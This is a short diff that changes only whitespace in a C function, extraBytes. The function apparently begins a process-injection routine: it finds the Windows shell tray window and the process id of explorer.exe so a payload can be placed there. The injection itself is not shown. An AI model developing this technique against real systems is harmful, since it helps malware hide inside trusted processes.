@@ -80,7 +80,7 @@ VOID extraBytes(LPVOID payload, DWORD payloadSize){
     
     // 1. Obtain a handle for the shell tray window
     hw = FindWindow(L"Shell_TrayWnd", NULL);
-
+   
     // 2. Obtain a process id for explorer.exe
     GetWindowThreadProcessId(hw, &pid);
     
